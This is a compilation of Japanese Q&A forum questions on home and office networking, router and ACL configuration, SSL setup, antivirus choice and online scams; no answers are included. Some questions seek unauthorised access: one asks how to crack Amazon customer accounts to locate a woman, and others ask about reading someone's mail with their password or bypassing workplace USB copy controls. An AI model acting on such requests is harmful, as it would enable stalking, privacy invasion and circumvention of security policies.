yahoo japan メールについて質問があります。ちょっと変わった質問なのですが、、yahoo japan ID とパスワードを知っていれば、yahoo japan(yahoo japan メール)に直接ログインしなくてもyahoo japan メールの受信したメールやそれに添付された写真などを見ること読むことは可能ですか？その方法ありますか？例えば、どんな方法ですか？私は方法まで詳しく知りたいわけではありませんが、ID とパスワードさえ知っていれば、yahoo japanに直接ログインしなくてもメールを読むことなどができるのか、どうか、教えてください。
PocketWiFiでステルスSSID設定にしてSSIDを検索しても表示されないようにしていますが この機能を有効にしていても表示できてしまうソフトウェアや方法はあるのでしょうか？
興味本位で年齢を入れてクリックしたら登録になり、10万近い請求が来ました。info.erotube@gmail.comと言うところです。ワンクリック詐欺ではないので、入金しないとダメみたいな事が書いてありました。退会も入金後でないと出来ないとの事。 大丈夫なんでしょうか？心配です。
ネットワークを物理的に分離しつつ各ネットワークに所属するPCのそれぞれ1台同士は通信出来ると言う構成を考えています。 本当であれば、NIC2枚挿しとかルータ（or VLAN）で分割するのがスマートなのでしょうが、お客さんが見た目でLANが分離していないと納得してくれなさそうです。 現在はシリアルクロスで繋いで通信をしているのですが、速度も遅く格好も悪いので何か良い方法があれば教えて頂きたいと思います。 なお、通信はファイルベースだとタイミング的に少々問題があるので、通信が出来るものを望みます。 データリンクケーブルがシリアルポートに見えて、しかも１００Mbpsで通信出来ればそれでもいいんですけどね…。 なお、接続はUSBのみとさせて頂きます。 よろしくお願いいたします。
特定の１０人に対して、インターネットの共有提供をしようと思うのですが、１０人同士の間での直接通信ができる環境は作りたくありません。有線ＬＡＮでいうところの「ＶＬＡＮ」に相当する設定を、無線で行いたいのです。 私が調べたところでは、「プライバシーセパレーター」といった名称の機能を使うと可能なようですが、以下のようなただし書きがありました。 【※有線側からは、複数の無線パソコンと通信できます。 】 この意味がよくわからずに困っております。 有線側と称しているのは、ＷＡＮ側でしょうか？ＬＡＮ側でしょうか？それとも両方でしょうか？仮に両方だとすると、有線側は「ＬＡＮ側＝ＶＬＡＮで切る」「ＷＡＮ側＝ルーターで保護しながら、必要な通信だけを通す」というイメージで構築すれば、セキュリティー的に保つことは可能でしょうか？不可能であれば、具体にどのような構成を考えればよいでしょうか？ 経験者の方やご存じの方がいらっしゃいましたらご教示ください。よろしくお願いします。 ※無線ＡＰは、バッファロー社製　WZR-HP-G450Hを想定しています。 　
ｉＰｈｏｎｅ４で、パスコードを、アルファベット１文字の簡単なものにしてあった状態で、ｉｏｓ５にアップロードしたところ、パスコードを入力する画面が、数字のキーボードに変わってしまい、アルファベットのパスワードが入力できなでいます。良い解決方法があるのでしょうか？
Windows 7でのハッカー対策について http://questionbox.jp.msn.com/qa7086787.html Windows 7でのハッカー対策について２ http://questionbox.jp.msn.com/qa7088806.html の続きです。 お騒がせして申し訳有りません。ｍｓｎのかってがわからないため，３を立てさせていただきました。 ＯＳはWindows 7のUltimateに決めました。後は，ハッカー対策について，その設定方法と手順を知りたいです。 もちろん，ＯＳだけでハッカーが防げるとは思っていないのですが，やらないよりはずっとましだと思っています。 曖昧模糊とした状態が対策方法を教えてくださらないのかと思い，以下の三つに分類させていただきます。 その一，ユーザー アカウント制御 （ＵＡＣ）について 一番最初にAdministratorを取られたと書いて有るのに，Administrator名の変更の提案がまったく無い事に私は驚きました。 私はまず，新しいＰＣのAdministratorを某アニメキャラクターの名前に変更，パスワードをかけ，Guest アカウントを無効，その他アカウントをすべて削除，Administratorの機能で必要な作業をした後，Administratorアカウントも無効にします。 もちろん私専用のアカウントは用意して，パスワードをかけます。 その他ＵＡＣについて，私は下調べをして有り，他の設定も考えて有るのですが，どなたかＵＡＣについてあかるい方でこの設定をした方がハッカーに入られないと言う設定方法がありましたら教えて下さい。 その二，コンパネ内管理ツール一群とgpedit.mscの設定 小さな子供でもできるＵＩなので，「ここをこうしたら良いよ。」と優しく丁寧に教えてくださる方をお待ちしています。 その三，その他 私はregeditを打ち込むのを厭いません。なぜなら最近のWindowsは正常レジストリを保存してくれてるからです。しかしながら，これはコンパネ内設定とからむので提案されたら慎重に調べます。 その他，ハッカーに対して，有効な手段の設定方法を教えて下さい。 以上，その一，その二，その三と分けて，その方面にあかるい方がお答えくださるようお願いします。 私は平日は早朝一回しか返答できません。また，みなさまのお答えしだいでは，Windows 7でのハッカー対策について４を立てさせていただきます。 よろしくご了承下さい。
http://questionbox.jp.msn.com/qa7086787.html の続きです。 さて，ぷららのＩＰも含めて，各国進入してきたＩＰの列挙の準備が調いました。 以降，「妄想」と，言う単語が出てきたら，即座にアップします。 それにしても，普通にウインドウ開いただけでは表示しきれないほど，私より上位のアカウントが大量に有るのに，何をもって，「妄想」と判断されたのか，まったくわかりません。 当該ぷららＩＰは神奈川県警察本部長に内容証明を送付済みですので，個人情報を問題にされてもかまわずアップするし，このｍｓｎを追い出されても，かまいません。 そんなことどうでも良いのです。 私はWindows XP Professionalを使っているので，グループポリシーの事は少しわかります。 しかしながら，ハッカーによって，これも阻害されていますが，Windows XP Professionalにおいて，のグループポリシー内のセキュリティの設定の変更がうまくできれば良いのかとも思います。 しかし，Windows 7の事はよくわかりません。 ここは質問する所なので，私の質問はただ一つ。 「Home PremiumとProfessionalとUltimateののどれを選べば良いでしょうか？。 Windows 7でのハッカー対策について，その設定方法と手順を詳しく解説して欲しいです。」 どうか，邪推や悪意の無い性根のまっすぐで善良で親切な方のご返答を切にお待ちしています。
こんばんは。 仮にしつこくハッキングされてるとして、OSを再インストールして、プロバイダを変えればもう大丈夫でしょうか？それともパソコンも変えないと、パソコンで探索できたりするのでしょうか？ (よく行くサイトから狙われる、よく使用するソフトがウイルスたったなどは除外します。) よろしくお願い致します。
富士通のビスタ２コアを使っています。セキュリティーの更新履歴が　多いのは なぜですか。意味が分かりません。更新履歴は１ヶ月ぐらいでいいのではと思うのですが 皆さんの知恵を御借りしたいのですが。
はじめまして。相談が有ります。 実は家には粘着質のハッカーが来ます。 ・Administratorを取る，その他必要も無いのに大量の私より上位のアカウントを作る。（見ると気分が悪くなるからもう見れない） ・お友達や彼氏からのメールを気まぐれでカットする。 ・上位アカウントでセキュリティーソフトを自在に操る。（「あなたの権限では起動できません。」と言うメッセージとか出された。） ・コレガのルータをわざわざ買って入れたけど効果なんて無い。 ・ネットストーカーでもあるから，新しいお友達のふりして，動画やリンク先で何かウイルス入れてくる。（もう確かめたくも無い） ・わざわざ海外ＩＰを使って進入して見せつける。（すでに放置） ・警察にはもう相談した。（取り合ってくれない） 今のＰＣは壊れてきたので，新しいＰＣを買う予定なのですが，新しいＰＣではハッカーを入れたくないのです。 今のＰＣはもうどうでも良いのです。と，言うか見たくないのです。 新しいＰＣはWindows 7 の６４ビット版にするつもりです。 そこで，相談なのですが，Home PremiumとProfessionalとUltimateののどれを選べば良いでしょうか？。 また，どのような対策を採れば良いのでしょうか？。 ネットストーカーでも有るので，プロバイダを変えても，新しいお友達のふりをして，板なりなんなりでＩＰを取るので無駄だと思います。 パソコンに詳しくない私にもわかるように教えていただけたらと思います。 とてもキモチワルイし涙が出てきます。誰か助けて下さい。 よろしくお願いします。
セキュリティーの更新履歴が１００個残っているのはなぜですか？
友達の家に自分のＰＣを持って行き そこでインターネットをしたいんですが そこの家では なんかＵＳＢみたいなのをさして電波をルーターから受け取ってるみたいなのですが そのルーターに線をつないで有線ＬＡＮにしても無線のほうに支障が出ることはありませんか?? 説明下手ですいません、、 回答お願いします
下記のコマンドでFTP(proftpd)をインストールしました。 ※FTP(proftpd)はUbuntuをインストール時に作成したユーザでインストールしました。 sudo apt-get install proftpd インストールしたFTP(proftpd)のバージョンは下記の通りです。 ProFTPD Version 1.3.3d htmlを格納先は下記の通りです。 /var/www/ wwwディレクトリの所有者等は下記の通りです。 drwxr-xr-x 2 root root 4096 2011-10-20 11:13 www 皆さんに聞きたい事はFTPユーザを作成する際の注意点などをご教授いただけませんでしょうか。 OSはUbuntuで、バージョンは11.0.4です。 今回、初めてUbuntuを勉強しており、ネットで調べながらっていうか、パクリながらFTP(proftpd)を設定しています。 些細な事や一般的な事など何でも構いませんので宜しくお願いします。 お力を貸してください。
こんばんは。 Webサーバを構築中にIPアドレスの変更の必要が出てしまい、 変更したところ、awstatsによるアクセス状況の更新されな くなりました。 「更新されない」とは、「http://ホスト名/awstats.pl」を 実行し、下記の個所２点を見て判断しました。 　・更新日付が、IP変更前と変わらない 　・アクセスログが、IPアドレス変更以降カウントされていない 色々調べたところ、apacheのアクセスログに「combined」 だけが大量に出力されていました。 #cat　/var/log/httpd/access_log combined combined combined 　　： ログ関係の設定を見てみましたが、導入時に変更したままでした。 #cat　/etc/httpd/conf/httpd.conf ServerName　web01 　: LogFormat　"%h　%l　%u　%t　\"%r\"　%>s　%b　\"%{Referer}i\"　\"%{User-Agent}i\""　common LogFormat　"%h　%l　%u　%t　\"%r\"　%>s　%b"　common LogFormat　"%{Referer}i　->　%U"　referer LogFormat　"%{User-agent}i"　agent 　: CustomLog　logs/access_log　combined 　: #cat　/etc/httpd/conf/httpd.conf 　: LogFormat=1 LogSeparator="　" SiteDomain="web01" HostAliases="localhost　127.0.0.1" DNSLookup=1 　: 環境は、以下の通りです。 OS　:CentOS　release　5.7　(Final) http:apache2.2.3 php　:php5.3 awstats:7.0 awstatsは初めての利用でしたので、IPアドレスの変更で影響が大きいとは 予想もしておらず、サイトを見ても似たようなサイトが見つからず困って しまいました。 「awstats.pl」は、色々なサイトを見て、「"YYYY年MM月"の日付の調整」等 「やっておくべき事項」は、対応しています。 解決策や再調査事項等のアドバイスをお願いします。
私の住んでいる公民館が市民のためにインターネットルームを作りパソコン教室などをやっていました。 ルータやハブを設置して30人ぐらいが一度にできる設備も持っています。 ところが平成20年にMeのサポートが無くなったためウィルス対策ができなくなったとの理由でインターネット接続を止めてしまいました。 実際このようなことがあるのでしょうか。 同じワークグループにMeがいると全体に影響するものでしょうか。 Meを使っている人が攻撃されるのはわかりますが周りに影響するとは思えないのです。 しかもさすがに今Meの動くパソコンもないと思うのですが。 どうも公民館の説明に納得できないので教えてください。
MRTGなどを使用し、監視対象のネットワーク機器のポートについて その使用率を監視したいと考えています。 例えば1Gbpsのポートで、現在500Mbpsまで送受信している、など これはSNMPのMIB値である、ifInOctetsなどで取得は可能でしょうか？。 ご教授いただけますと幸いです。
京橋の英会話サークルで10万貸したニックネームでキャサリンを探したいのですが、彼女は超能力の本のムーブックスを買っているのですが、AMAZON.COJPのサーバーにアクセスする方法を教えてください。全ての顧客の履歴を3年以内に、女性でマンションの住所で２３区以内でムーブックスの本を買っている女性を探したいです。アカウントサービスの個人個人のパスワードを攻略するやり方を教えてください。個人情報保護法はNETで見る限り、個人情報保護法 罪、と入力すると警察もしている事で勧告程度なので教えてください。それからAMAZON.CO.JPのサーバーで次の人の履歴を見るにはどうすれば良いのですか？
パソコン内のファイルをロックしたいと思っていますけれども、どのような方法で設定すればよいのかわかりません。というのは、会社内でネットでつながっていて、ネット内ならばだれでも入り込めるファイルです。しかし、この部署の者以外はいじられては困るので、他の者がネットを通じてそのファイルを開けようとしても開けることができない状態にしたいと思っています。よろしくお願い致します。
初めて投稿させていただきます。 現在業務でネットワーク構築を行っております。 ネットワークの構成といたしまして、Ｌ３スイッチ２台でVRRPの構成で、なおかつＬ３スイッチをＤＮＳサーバとしても使用することを考えております。 この構成で２点質問なのですが、 １つ目にＤＮＳのサービスだけダウンした場合に、VRRPがエラーを検出しプライマリー機とセカンダリー機は切り替わるのでしょうか。 ２つ目にそもそもＤＮＳの機能だけが落ちてしまうということがあるのでしょうか。 上記、ご存知の方がいらっしゃればご教示よろしくお願いいたします。
CCNAを勉強中です。 一度受験したことがありましたが、 予想したとおり、シュミレーション問題で 手こずりました。 しかし、書籍を使って苦手な分野を 復習しようとしても、書いてあることを 理解するのが困難です。 そこでシュミレータソフトを使って、 手を動かしながら実際に検証することで、 理解しやすくなるだろうと考えたので、 ソフトの購入を考えています。 Boson of netsimが優秀なようですが、 日本語がないのが不安なのでNetwork Visualizerを 考えています。 このソフトって、Ver4.0～6.0とありますが、 何がどのように変わっているのでしょうか？ Ver4.0は6.0の半額ぐらいなので、 安いほうが助かるのですが。 VerUpというのは、CCNAの出題傾向が大幅に変わった際に、 その出題傾向に見合ったシュミレータソフトにする為に、 行われるものなのでしょうか？ Verは最新のもののほうが良いのでしょうか？ ご意見お願いします。
以下のネットワーク設定で問題があれば指摘せよ。 IPアドレス ：192.168.1.15 サブネットマスク ：192.168.1.128 ネットワークアドレス ：192.168.1.0 ブロードキャストアドレス ：192.168.1.255 ゲートウェイアドレス ：192.168.1.254 DNSサーバ ：192.168.3.2 初心者なので何というキーワードでググれば良いのかもわかりません。 教えて下さい。
Googleにログインをして、 そのままログアウトをせず、シャットダウンをしてしまったら、 どうなりますか？ よろしくお願いします。<(_ _)>
VirtualBoxでホストOS（Windows7)、ゲストOS（WindowsXP)の環境で互いに pingを通せるようにしたいのですがどうしたら良いのでしょう？ ゲストOSからホストOSにはpingは通るのですが、その逆が通りません。 宜しくお願い致します。
インターネットバンキングの口座開設を考えています セキィリティ対策が一番進んでいる銀行を選びたいので その対策内容を説明してあるサイトを教えてください ネット専用銀行でなく、都銀、地銀を検討しています 事前に口座開設まではしておき、その後、ネットで インターネットバンキングの申込を検討しています
現在I-PHONE4を使っています。アンドロイドなどのスマートフォン用のセキュルティソフトが出ていますがI-PHONEにもセキュリティソフトは必要でしょうか？
３日位前から急にYahoo!Japanが使えなって困っています。 トップページは表示できるのですが、メールや検索等を行おうとすると、 Gateway Timeoutとだけ寂しく表示されます。 他ののサイトは今までどおり問題なく使えています。 Yahoo!USAでさえ普通に使えます。 何故かYahoo!Japanだけ使えません。 Yahoo!Japanが何日もダウンしているとは考えずらいですが、 何か心当たりのある方、解決方法をご教授できますでしょうか？
早急に回答お願いします！ 昨日携帯でサイトを見ていて動画を再生するのに18歳以上のところを押したら 「登録ありがとうございます。3日以内に49800円入金して下さい。」と書かれたページになりました これってワンクリック詐欺ですか？ 因みにサイト名は動画サイトクッキーです！
イーサネット（IEEE802.3）の伝播遅延時間について、 一般的にはどの程度の値になるのか知りたいです。　 （ケーブルの長さによるのでしょうが、例えば100mの場合伝播遅延は△△秒、 のように教えていただければありがたいです。） また、参考文献や参考URLも示していただければ幸いです。 よろしくお願いします。
アパート経営をしているものです。 みんなで１台の無線ルータを使用したいのですが、WEPキーは調べた範囲ですが最大４つしか持てないのでしょうか？８部屋あるので８つ欲しいところです。 複数のルータをタコ足配線のようにつなげれば８つにもできそうですが、もっと良い方法がありましたら教えてください。m_m
A・・・192.168.11.0/24セグメント B・・・172.16.12.0/24セグメント 以下要件を満たしたいのですが、上手くいきません [要件] 1.192.168.11.49が、デフォルトゲートウェイであり、80番通信以外は許可したい。(管理画面が見えるため) 2.172.16.12.0から、192.168.11.0セグメントへの通信は、拒否したい(icmpはOK) 3.192.168.11.11から172.16.12.0端末への通信は全て許可する。(RDPとか、ファイルコピーしたいため) [作成したACL] access-list 100 deny tcp 172.16.12.0 0.0.0.255 host 192.168.11.49 eq 80 access-list 100 permit ip 172.16.12.0 0.0.0.255 host 192.168.11.49 access-list 100 deny ip 172.16.12.0 0.0.0.255 192.168.11.0 0.0.0.255 access-list 100 permit ip any any ip access-group 100 in [概略図] 192.168.11.0/24セグメント-------(fa0/0)ルーター(fa0/1)-------172.16.12.0/24セグメント fa0/1のinバウンドにACLを設定。 [質問] 2のicmpも現在通らないのですが、これはicmp許可すれば通るとおもうので問題ではないのですが、 3の条件が満たせません。 →私自身、192.から172にRDP通信を行ったとき、fa0/0にはACLを設定しておらず、192からのRDPがとおるので、172からの応答はinバウンドのACLに引っかからないと思っていたのですが、 access-list 100 deny ip 172.16.12.0 0.0.0.255 192.168.11.0 0.0.0.255 に　引っかかって通信が成功しません。 どなたか解決方法をご存知の方がいらっしゃいましたら ご教授のほう宜しくお願いします。
業務上、とあるPC群に、ウィルス対策ソフトを導入することになりました。 条件としては 1) 法人向け製品でなく、個別に管理することを目的に、個人向け・各PC毎にパッケージ化された商品を利用したい 2) OSはXPからWin7 64bit版まで混在する予定(できればWindows2003、2008Serverもあれば良いのですが・・・) 3) 基本はインターネット接続できないPCにインストールするので、導入時およびパターンファイル更新時にインターネット接続が不要なもの(別のインターネット接続されたPCでアクティベートキーやパターン更新ファイルをダウンロードし、USBメモリなどで展開するパターンがベスト。最悪の場合インストール時のみインターネット接続可能) 4) 業務にて利用するため、無償のソフトウェアおよびダウンロード販売のみのソフトウェアは不可 というところになります。 現状、上の条件で私が選定したものとしては ・カスペルスキー社製 インターネット セキュリティ 2012 ・シマンテック社製 ノートン アンチウィルス 2012 の2点です。 ここから質問とさせていただきたいのですが 1. 上記2点の製品について、3)の条件を満たすかどうかが心配です。実際のところ、それぞれの製品について 「インストール時のインターネット接続の要・不要」 「パターン更新時のインターネット接続の要・不要」 を御存知でしたら御教授をいただけないでしょうか。 2. 上記2点の製品について、2)の条件の「2003、2008Serverへの適用」からは外れてしまいます。この条件をも満たす製品を別途御存知でしたら御教授ください。 本当は法人向け製品を導入したほうが早いことは重々承知しているのですが、何卒お知恵を貸していただけますよう、よろしくお願いいたします。
下記の事象についてヒントになるようなことでもご存知でしたらご教授ください。 現在、社内でWindowsPCでLANを構築しています。Active Directoryは使用せずWorkgroup接続です。ファイルサーバーとしてWindows Server 2003（正確にはWindows Storage Server 2003）を使用しています。 このファイルサーバ上の共有フォルダに、とあるWindowsXPのマシンからエクスプローラを使用して接続する際に、マシン名での接続（\\File-Server\共有）であれば問題なく接続できるのに、IPアドレスでの指定（\\192.168.0.6\共有）だとエラーとなるという事象が起きています。 この原因や対策をご存知でしたらご教授ください。 （関連しそうなトピックでもご存知でしたらご教授ください。） マシン名では接続できるという点で、配線には問題なく名前解決も問題ない、さらにファイルサーバにログインするID、パスワードも問題なしと考えています。 他人のPCなのでじっくりと観察しておらず、エラーメッセージは正確には記載できませんがアクセス権限系のエラーだったとは思います。 （同じLAN上にある私のWindowsXPマシンでは、マシン名でもIPアドレス指定でもそのファイルサーバの共有フォルダには接続できます。）
とある無料のはずのアダルトサイトにアクセスしたら、その後、そのサイトの「入金ください・・・・」のウインドウが自動的に開き、いくら閉じても、キーボードに触るたびに開きます。このソフトを削除する方法を教えてください。尚、「プログラムのアンインストール」でそれらしきプログラムを削除したのですが、ウインドウは消えません。よろしくお願いします。
スマートフォンではない携帯電話の使用履歴(メール内容、通話内容・履歴、サイト閲覧履歴、ゲーム等)が他人に知れてしまうことはあるのでしょうか？ 質問回答で、「携帯電話内の使用で自分しか知らない内容を他人が口にしていた」というのをみかけました。 このようなことはあり得るのでしょうか？ 今、こうしてgooにアクセスしているのが丸分かりだったり… 自分の周りの知り合いが、携帯の使用内容を盗み見していたらと思うと怖いのですが、このようなことあり得ますでしょうか？ ウイルス、特殊な方法が存在するのでしょうか？ 詳しい方、よろしくお願いいたします。
小規模の拠点間の社内ネットワークを構築する方法で質問です 他の拠点から安全に社内のファイルサーバにアクセスさせたいのですが 現在バッファローのWZR-HP-AG300Hを使用してルーターのPPTPサーバを設定して外部から接続させているのですが8台までしか接続できず、接続数を増やしたいのですが増やせず困っております。 ルーター同士でVPN接続が完結出来る物はあるのでしょうか？ ファイルサーバはLINUXのSAMBAを使用しているのですがルーターでVPNパススルーさせてLINUXにVPNの設定を入れればOKなのでしょうか？ わかりずらい内容かもしれませんがわかる方がいらっしゃれば教えていただけると嬉しいです。 宜しくお願い致します。
現在NTTのPN-100HDというものを使ってネットに接続しています。 この際に複数台から同時接続する方法があったら教えてください。 また、現在はAが接続中にBが接続するとBが優先されAの接続が切れてしまうのですが、 パソコン上の設定などでAを優先させる方法などはあるのでしょうか？
　小規模の老人福祉施設の経営者から、施設の利用者様が手軽にインターネットを見れるようなシステムの構築を依頼されています。 　利用者は、十数名で、個室でインターネットを見れるようにし、又、利用者の年齢は、かなり高い方ばかりです。 　依頼主からは、アダルトサイトなど有害サイトは、利用者様がアクセスできないように仕組みにしてくれるようにとの依頼があり、このため、プロキシサーバを置き、ブラックリスト方式でフィルタリングする考えです。 　その場合、このブラックリストは、「有害サイト対策団体」などが所有し、更新しているリストをダウンロードし、これを自動的にプロキシへ設定する方式としたいのですが、このようなフィルタリングソフトをご存じありませんでしょうか。 　有害サイトは、雨後のタケノコのように発生するので、このようなサイトを絶えずリストアップして、プロキシの設定が自動化できれば考えてております。 どなたか、このようなフィルタリングソフトをご存じであれば、是非、教えてください。 よろしくお願いします。
リンクをクリックしても、ソースが表示されず、「このページは表示できません」とエラーが 出てしまいます。なぜ、リンクをクリックしても表示されないんでしょうか？
メールでしか話していない内容を 知人が明らかに把握しているとしか思えない事がありました。 他にもインターネットの閲覧履歴も。 その人間は私の携帯、パソコンは触れない環境です。 見られていると感じたままでは、メンタルがおかしくなるので、 誰かが見ているか、見ていないか、確認を取りたいです。 可能でしょうか？
知り合いの人からの相談です。 ワンルームマンションをオーナーしているそうで、最近住人の誰かが大量のデーターのやり取りを しているそうでプロバイダーのOCNから警告がきたそうです。短時間で30G程だそうです。 環境はマンション自体がOCN+ルーターで各部屋に分けているようです。 プロバイダーからは契約解除も示唆されている見たいです。 それで使用者を特定するかファイル共有ソフトの帯域制限などして回避したいのですが どのような方法がありますでしょうか。識者の方教えて下さい。
先日会社で使用しているPCのセキリュティーが厳しくなり、データーをUSBにコピーできなくなりました。仕事上どうしてもUSBメモリーにデーターを格納したいです。おそらくコピーガードをするソフトを会社側がインストールしたと思われます。このPC上のデーターをUSBメモリーにコピー出来る方法がありましたら教えて下さい。CDRだとコピーは可能ですが、会社のCDRを借りるのには申請が大変です。
http://oshiete.goo.ne.jp/qa/1976304.html かなり以前の記事ですがこういう投稿を見た上で最近無線LANの 需要がどこかしこでも増えていると思いますが知り合いの店舗でも 公開をしたいらしく、接続時に認証サイト（規約の同意と店のメニューなど）を開いた上で 自由に利用させたいと相談をうけました。 よくあるアクセスポイントのようにスマホなどで選択すると自動でログイン画面が表示されたりしますが自動で特定のページにアクセスさせる技術はどのようにやれば実現可能でしょうか？いろいろ検索したり本など見て見ましたがどのキーワードに含まれる技術なのか・・わからず困ってます（プロキシ周りかと思いますが） 機器などはまだ用意しておらず実装面ともしセキュリティ面で気をつけることあればアドバイスいただけると助かります。
WR1200Hを使用しています。 ルータモードにしてあります。 spaaqs光です。 パソコンは、WindowsVistaSP3です。 パソコンを有線で接続しているとipadがwifi接続できません。 パソコンを無線(内蔵)接続しても同じです。 また、iPhondとipadもwifiで同時接続ができません。 いずれかが、接続されていると他は接続ができません。 PPPoE接続で一度複数接続できたのですが、時間が経つと 接続ができなくなってしまいました。 アクセスポイントでやってみましたが同じでした。 いろいろ調べて試してみましたがどうにもうまくいきません。 これだけの説明では難しいと思いますが、アドバイス頂ければと思います。 宜しくお願いします。
■環境 サーバー：Apache + mod_ssl 初めてSSLサーバー証明をインストールします。 色んなサイトを見て勉強しながらやっているのですが、 どうしても腑に落ちないというか、どうもすっきりしない点がありましたので、 お知恵をお借りしたく、質問させて頂きました。 気になる部分はCSRを生成するコマンド、以下となります。 # mkdir /usr/local/certs # cd /usr/local/certs # openssl req -new -newkey rsa:2048 -nodes -keyout 「名前」.key -out 「名前」.csr Generating a 2048 bit RSA private key 参考にしたサイト http://www.digicert.ne.jp/howto/csr/csr_apache.h … http://cspssl.jp/support/csr_apache.html 上のコマンドだと、PEMフレーズを入力せずに、2ファイルが生成されます。 しかしながら、その他の様々なサイトでは 先にパスフレーズを登録して、例えば、、 # openssl req -new -key 「名前」.key -out 「名前」.csr Enter pass phrase for server.key: このようなコマンドに続いてパスフレーズを聞かれるという形になっています。 また各種サイトには、PEMフレーズは省略も出来るとあります。 セキュリティ度は下がるが、再起動時に何度も入力しなくて済むという利便性があるとか。 もしかすると前者では、PEMフレーズが省略されたCSRを生成しているのかと 考えたのですが、私の考えで合っているのでしょうか。 それとも、前者のCSRで認証局に申請した物は、作り直さなくてはならないでしょうか。 素人質問で大変申し訳ないと思いますが、 ちょっと頭が混乱してしまってまして どなたかヒントを頂ければありがたいです。 すいませんがよろしくお願いします。
Windows Server 2008 R2 3台構成 それぞれNIC6枚あり、3枚を使用して通信しています。 各サーバを仮にA、B、Cと呼びます。 また、各ネットワークの名前と設定は以下です。 public IP:10.5.XXX.YYY Subnet:255.255.255.0 DefaultGateway:10.5.XXX.1 DNS設定済み private IP:192.168.1.1 ～ 192.168.1.3 Subnet:255.255.255.0 GatewayとDNSはなし nas IP:192.168.100.1 ～ 192.168.100.3 Subnet:255.255.255.0 GatewayとDNSはなし publicは社内LANに繋がっております。 privateはスイッチを使って、それぞれのサーバ間で通信できるようにしています。 A⇔B、B⇔C、C⇔Aでpingが通ります。 nasはスイッチを使ってそれぞれのサーバ間で繋がっているのと同時に、2台のNASを接続しています。このNASを仮にD,Eと呼びます Dのネットワーク設定 IP:192.168.100.150 Subnet:255.255.255.0 Eのネットワーク設定 IP:192.168.100.151 Subnet:255.255.255.0 ここで、192.168.100.0のネットワークに対して以下のようにpingを飛ばしました。 A⇒D A⇒E B⇒D B⇒E C⇒D C⇒E A⇔B A⇔C はpingが通ります。 しかし、ここで、B⇔Cのpingが通りません。 B⇒CもC⇒Bも通りません。 再起動しても通りませんでした。 原因としては何が考えられるでしょうか。 なんかのミスでしょうか・・・。
こんばんは windows7のsystem32\svchost.exeなのですが 数日前からどこかに接続しようとします。 そのたびファイアウォールが「ブロックしますか？」 と言ってくるのでブロックしているのですがインターネットするたび 毎回なので少し面倒になってきました。 SvchostAnalyzerでどういったsvchost.exeなのか調べてみたのですが よく分らず困っております。 接続させても問題ないのでしょうか？ それともずっとブロックしても問題ないのでしょうか？
どうかご教授願います。 アクセスリストについて調べているとプロトコルをIPにした場合 TCP/UDP/ICMPもすべて含まれると書いてありました。 しかし、私の管理している環境では以下のように アクセスリストのプロトコルをipで設定した後に 今度はicmpで設定しているのですがこれは必要なのでしょうか? ※アクセスリストは一部を書いただけなのでもちろんこの後に permitで許可したアクセスリストはあります。 よろしくお願いいたします。 interface Vlan5 description /test/ ip address 192.168.5.254 255.255.255.0 ip access-group 10 in access-list 10 deny ip 192.168.5.128 0.0.0.127 host 192.168.6.10 access-list 10 deny ip host 192.168.5.1 host 192.168.6.1 access-list 10 deny ip host 192.168.5.1 host 192.168.6.2 access-list 10 deny icmp 192.168.5.128 0.0.0.127 host 192.168.6.10 access-list 10 deny icmp host 192.168.5.1 host 192.168.6.1 access-list 10 deny icmp host 192.168.5.1 host 192.168.6.2
と、Microsoftさんが言ってますが どうなっているのでしょう
とあるLANについて問題を解決することになりました。 下のような構成で、LAN経由でFTPマシンの共有フォルダへ入れ、 クライアントPCからFTPでの接続も出来るようにしたいのですが、 どの箇所にどのような調整するのがよいでしょうか？ ちなみに外部からのFTPアクセスは可能でした。 ┌──┐ │　　　│ルータ └┬─┘ 　│ ┌┴─┐FortiGateファイアーウォール │　　　├─────┐ └┬─┘　　　　　　　　│ ┌┴─┐　　　　　　┌┴─┐192.168.10.100 │ハブ│━━━━│FTP │255.255.255.0 └┬─┘　　　　　　└──┘ 　　│　 　　│ ┌─┬─┬─┬─┐ □　　□　□　□　　□ クライアントPC 192.168.1.～ 255.255.255.0 ○　太線のケーブル(━)を繋げると 　・　クライアントPCから、FTP鯖へFTP接続出来ない 　　　(host名、IP、どちらのpingも届く) 　・　FTPマシンの共有フォルダへLAN経由で入れるようになる ○　太線のケーブル(━)を外すと 　・　クライアントPCから、FTP鯖へFTPで接続出来る(pasvモードは繋がらない) 　　　(192.168.10.100へのpingは届く、しかしhost名を使ってのpingは届かない) 　・　FTPマシンの共有フォルダへLAN経由で入れなくなる そもそも辞めてしまった先任が組んだ構成で、 この構成が外部へ公開するFTPを運用する上で適切なのかよく分かりません。 可能でしたらその点も含めてアドバイスを頂ければ助かります。
助けてください。 先ほど、TCPモニターというツールをインストールして、 現在のセッションを表示しました。 その時、ポート443(SSL)でamazonと繋がっていました。 また、もうひとつポート443でどこかと繋がっていました。 しかし、その時、私はAmazonのページを開いていません。 直前にAmazonを開いていたわけでもありません。 ブラウザで同時に3つくらいサイトを表示していました。 私のコンピュータが何者かに遠隔操作されているのでしょうか？ 怖いです。 もう少し、正確に言いますと、接続先が本当にAmazonだったのかも 怪しいです。 ホスト名は、ナントカamazon.co.jpみたいな感じだったと思います。 正確性の無い情報ばかりで申し訳ありません。 大変危険なのでしょうか？？ ネットワークに強い方、判断をお願い致します。
geogleメールで誤って送付してはいけない箇所に送信してしまいました。相手が確認する前に至急送信メールを削除したいのですが、対応方法を教えてください。セキュリテイ上問題のある内容が含まれていますので、何とか今晩中に削除しなければなりません。大至急教えてください。 よろしくお願いします。
linux & ネットワーク関係の初心者です。 ローカルの環境でWEBサーバを構築しようとしています。 サーバはlinuxでapacheを動かし、一通りの設定が終わったのでブラウザからIPをたたいてページの表示をさせようとしました。 すると、以下のような表示がされました。 ---------------------------------------------------------------------------------- （２）ポート80番のOPEN ルーター側の設定でポート80番をOPENする。 ※ルーターの設定は各ルーターのマニュアルまたはメーカー別ルーターポート開放手順を参照 ポートチェック【外部からポート開放確認】で「host名」にサーバー名(例:centossrv.com)、「port番号」に80と入力して「ポートチェック」ボタン押下し、「ホスト＝centossrv.com　ポート＝80　にアクセスできました。」と表示されることを確認。 （３）外部からのWebサーバーアクセス確認 外部からWebサーバーにアクセスできるか確認する。 ---------------------------------------------------------------------------------- そこで、ルーターの設定でポート80番を開放しようと思うのですが、 どうやら、コマンドラインでのみ変更が可能な設定になっているようです。 どのようなコマンドで変更をすればよいでしょうか？ ちなみにマニュアルを調べたのですが、ポートの開放に関係したところがわかりませんでした。 ■オンラインマニュアル http://www.rtpro.yamaha.co.jp/RT/manual/rt-commo … よろしくお願いいたします。
